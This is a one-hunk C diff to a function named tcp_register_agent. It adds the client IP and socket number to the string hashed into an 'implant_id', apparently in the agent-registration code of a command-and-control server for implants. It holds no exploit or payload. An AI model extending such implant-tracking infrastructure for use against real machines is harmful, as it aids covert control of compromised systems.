@@ -123,7 +123,7 @@ void tcp_register_agent(cJSON *json, char *ip, int sock) {
     cJSON *arch = cJSON_GetObjectItem(json, "arch");
 
     char input[255];
-    snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
+    snprintf(input, sizeof(input), "%s-%s-%s-%s-%d", hostname->valuestring, os->valuestring, arch->valuestring, ip, sock);
     char implant_id[65];
    GenerateID(input, implant_id);
 
